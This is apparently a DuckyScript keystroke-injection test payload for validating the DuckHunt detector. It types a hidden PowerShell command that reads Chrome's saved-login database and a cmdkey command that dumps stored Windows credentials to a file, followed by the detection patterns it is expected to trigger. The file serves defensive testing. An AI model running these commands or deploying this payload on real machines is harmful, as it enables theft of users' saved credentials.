REM DuckHunt Test Payload: Credential Theft Attack
REM This is a SYNTHETIC test payload for DuckHunt detection validation
REM Simulates credential harvesting via browser password dump

REM Test 5: Browser credential theft
REM Attack opens PowerShell and extracts saved browser credentials

DELAY 100
GUI r
DELAY 50
STRING powershell -w hidden -Command "Get-Content '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data'"
DELAY 50
ENTER
DELAY 200

REM Alternative: Windows Credential Manager dump
GUI r
DELAY 50
STRING cmd /c cmdkey /list > C:\temp\creds.txt
DELAY 50
ENTER

REM Expected Detection:
REM - Speed anomaly (fast consistent typing)
REM - Pattern match: WIN+R, "powershell -w hidden", "Get-Content", "Login Data"
REM - Pattern match: "cmdkey /list" (credential enumeration)
REM - High-risk command sequences
REM - Zero error rate
REM - File path patterns typical of credential theft

REM Detection Confidence: Expected >0.90
REM Attack Category: Credential Access (MITRE ATT&CK T1555)

REM Notes:
REM - This payload represents a real-world credential theft technique
REM - Browser password databases are common targets
REM - Windows Credential Manager enumeration is suspicious behavior
REM - Both techniques should trigger high-confidence alerts
